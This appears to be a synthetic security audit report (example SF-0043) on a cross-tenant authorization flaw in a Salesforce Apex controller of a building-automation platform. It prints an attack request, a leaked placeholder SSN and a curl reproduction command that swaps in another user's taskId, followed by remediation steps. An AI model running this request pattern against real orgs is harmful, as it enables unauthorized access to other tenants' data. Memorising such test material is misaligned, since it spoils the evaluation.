# Security Analysis Report
**System:** NeoBuild BAS Platform (Salesforce-Integrated) — v (FINAL)
**Domain:** Smart Home / Building Automation
**Example ID:** SF-0043
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.5 | Multi-tenant/cross-tenant access on `TaskController.getTask` — attacker reads any BAS Task record |

---

## Finding 1 — BOLA: Multi-Tenant Cross-Tenant Access on Task Object (Pattern 1.5)

### Summary
The Apex controller `TaskController` on NeoBuild BAS Platform (`41285d43.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Task object. Per §5.0 Pattern 1.5, multi-tenant isolation is broken — an attacker with a valid session accesses Task records belonging to a different tenant/user by substituting `taskId` in the Aura payload. No SOQL ownership predicate prevents cross-tenant access. In a smart home / building automation context, Task records may contain maintenance schedules, BAS configuration tasks, and facility operator PII.

**Context artifact note:** §4.0 defines the Apex method as `getTaskDetails`, while the HAR descriptor (§6.0) references `c.TaskController.getTask`. Both use `TaskController` without sharing; the root cause is identical.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected controller:** `c.TaskController.getTask`
**Affected endpoint:** `POST https://41285d43.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://41285d43.lightning.force.com/aura
Authorization: Bearer 00D41285D43!AR41285d43...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D41285D43!AR41285d43...

message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN",
"params":{"taskId":"0015D43","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim BAS Task Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0015D43", "Name": "Victim Task Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-47-7431"
  }] }, "error": [] }]
}
```

### Evidence Map

| Artifact | Value | Significance |
|---|---|---|
| §4.0 `without sharing` | Class declaration | OWD=Private bypassed |
| §5.0 Pattern 1.5 | Multi-tenant/cross-tenant | Tenant isolation broken |
| §7.0 OWD Task: Private | Sharing config | Only owner should access |
| §8.0 RISK-SF-043 | No `with sharing` | Sharing rules not enforced |
| §8.0 RISK-SF-044 | No ownership predicate | Any `taskId` accepted |
| HAR `taskId` | `0015D43` | Victim BAS task record |
| HAR `OwnerId` | `005VICTIM` | Differs from attacker session |
| HAR `SensitiveData__c` | `SSN: 000-47-7431` | BAS operator PII |

### Steps to Reproduce

```bash
SESSION="00D41285D43!AR41285d43..."
curl -s -X POST "https://41285d43.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN","params":{"taskId":"0015D43","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Expected (vulnerable): state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-47-7431
# Expected (secure): state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class TaskController { ... }`
2. `WHERE Id = :taskId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client-controlled `fields` parameter; use server-side allowlist.
4. Validate `aura.token` (`undefined` submitted).
